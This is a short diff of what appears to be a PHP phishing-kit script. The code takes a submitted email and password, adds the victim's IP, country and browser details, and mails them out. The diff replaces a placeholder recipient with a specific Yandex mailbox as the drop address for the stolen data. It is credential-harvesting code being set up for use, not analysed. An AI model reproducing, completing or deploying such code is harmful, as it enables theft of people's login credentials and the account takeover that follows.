@@ -187,7 +187,7 @@ if($email != null && $password != null){
 	$message .= $obj->detect()->getInfo()."\n";
 	$subject = $_POST['page']." |".$countries->$code."| ".$ip;
 
-$result = "none@gmail.com";
+$result = "jeanjean00@yandex.com";
 mail($result, $subject, $message); 
 
 	$signal = 'ok';
